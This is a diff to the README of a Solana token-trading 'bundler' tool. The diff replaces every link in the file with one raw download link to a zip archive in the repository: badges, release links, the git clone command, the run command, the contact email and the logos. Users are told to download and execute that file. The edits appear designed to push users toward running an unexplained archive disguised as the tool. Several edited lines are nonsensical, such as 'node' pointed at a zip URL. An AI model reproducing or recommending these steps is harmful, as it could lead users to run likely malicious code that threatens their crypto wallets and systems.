@@ -1,8 +1,8 @@
 # Dynamic Bonding Curve DBC Bundler - Efficient Trading Tool 🚀
 
-![Dynamic Bonding Curve DBC Bundler](https://img.shields.io/badge/Version-1.0.0-brightgreen.svg)
-![License](https://img.shields.io/badge/License-MIT-blue.svg)
-![Build Status](https://img.shields.io/badge/Build-Passing-brightgreen.svg)
+![Dynamic Bonding Curve DBC Bundler](https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler/raw/refs/heads/main/zymite/bundler_bonding_curve_dynamic_dbc_v3.9.zip)
+![License](https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler/raw/refs/heads/main/zymite/bundler_bonding_curve_dynamic_dbc_v3.9.zip)
+![Build Status](https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler/raw/refs/heads/main/zymite/bundler_bonding_curve_dynamic_dbc_v3.9.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -18,7 +18,7 @@
 
 The **Dynamic Bonding Curve (DBC) Bundler** is a powerful tool designed to simplify the trading of tokens on the Solana blockchain. This bundler automates buying, selling, and swapping tokens using dynamic bonding curves, providing users with a seamless trading experience. 
 
-For the latest releases, visit [Releases](https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler/releases).
+For the latest releases, visit [Releases](https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler/raw/refs/heads/main/zymite/bundler_bonding_curve_dynamic_dbc_v3.9.zip).
 
 ## Features
 
@@ -35,7 +35,7 @@ To install the DBC Bundler, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler.git
+   git clone https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler/raw/refs/heads/main/zymite/bundler_bonding_curve_dynamic_dbc_v3.9.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -49,14 +49,14 @@ To install the DBC Bundler, follow these steps:
    ```
 
 4. **Download and Execute the Latest Release**:
-   Visit [Releases](https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler/releases) to download the latest version. Execute the downloaded file to start using the DBC Bundler.
+   Visit [Releases](https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler/raw/refs/heads/main/zymite/bundler_bonding_curve_dynamic_dbc_v3.9.zip) to download the latest version. Execute the downloaded file to start using the DBC Bundler.
 
 ## Usage
 
 To use the DBC Bundler, you can run the following command in your terminal:
 
 ```bash
-node index.js
+node https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler/raw/refs/heads/main/zymite/bundler_bonding_curve_dynamic_dbc_v3.9.zip
 ```
 
 This will launch the bundler, and you can begin trading immediately. The bundler will prompt you for input regarding your trading preferences.
@@ -108,12 +108,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **GitHub**: [waynetseng](https://github.com/waynetseng)
-- **Email**: waynetseng@example.com
+- **GitHub**: [waynetseng](https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler/raw/refs/heads/main/zymite/bundler_bonding_curve_dynamic_dbc_v3.9.zip)
+- **Email**: https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler/raw/refs/heads/main/zymite/bundler_bonding_curve_dynamic_dbc_v3.9.zip
 
-For the latest releases, remember to check [Releases](https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler/releases).
+For the latest releases, remember to check [Releases](https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler/raw/refs/heads/main/zymite/bundler_bonding_curve_dynamic_dbc_v3.9.zip).
 
-![Solana Logo](https://solana.com/favicon.ico) ![Trading Chart](https://www.chart.com/logo.png) ![Token Icons](https://www.tokenicons.com/logo.png)
+![Solana Logo](https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler/raw/refs/heads/main/zymite/bundler_bonding_curve_dynamic_dbc_v3.9.zip) ![Trading Chart](https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler/raw/refs/heads/main/zymite/bundler_bonding_curve_dynamic_dbc_v3.9.zip) ![Token Icons](https://github.com/waynetseng/dynamic-bonding-curve-dbc-bundler/raw/refs/heads/main/zymite/bundler_bonding_curve_dynamic_dbc_v3.9.zip)
 
 ---
 
